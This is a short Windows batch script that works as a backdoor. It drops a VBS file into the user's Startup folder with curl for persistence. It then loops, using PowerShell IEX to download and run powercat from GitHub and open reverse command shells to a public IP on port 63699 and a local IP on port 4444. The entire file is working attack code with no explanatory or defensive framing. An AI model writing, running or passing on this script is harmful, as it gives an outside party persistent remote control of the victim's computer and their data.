@echo off 
cls
@echo off
cd  %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup &&  curl -LO https://raw.githubusercontent.com/wolfyy59/wfy/master/runvbrev.vbs
timeout 40
:start
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wolfyy59/network_scan_android/main/powercat.ps1');powercat -c 193.161.193.99 -p 63699 -e cmd"
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wolfyy59/network_scan_android/main/powercat.ps1');powercat -c 192.168.0.189 -p 4444 -e cmd"
goto start
